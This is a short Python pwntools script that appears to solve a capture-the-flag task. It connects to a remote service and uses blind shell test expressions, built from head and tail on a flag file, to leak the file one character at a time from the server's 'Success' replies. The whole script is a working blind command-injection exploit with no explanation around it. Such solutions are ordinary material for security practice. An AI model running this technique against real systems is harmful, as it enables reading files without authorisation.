from pwn import *
import string

payload = "[ $(head -c {} maybehere/flag.txt | tail -c 1) = '{}' ]"

r = remote("tasks.kksctf.ru", 30010)
r.recvuntil("$")
flag = ""
i = len(flag) + 1

while True:
    for l in string.printable:
        r.sendline(payload.format(i, l))
        if b"Success" in r.recvuntil("$"):
            i = i+1
            flag += l
            print("[+] Char found! {}".format(flag))
            break
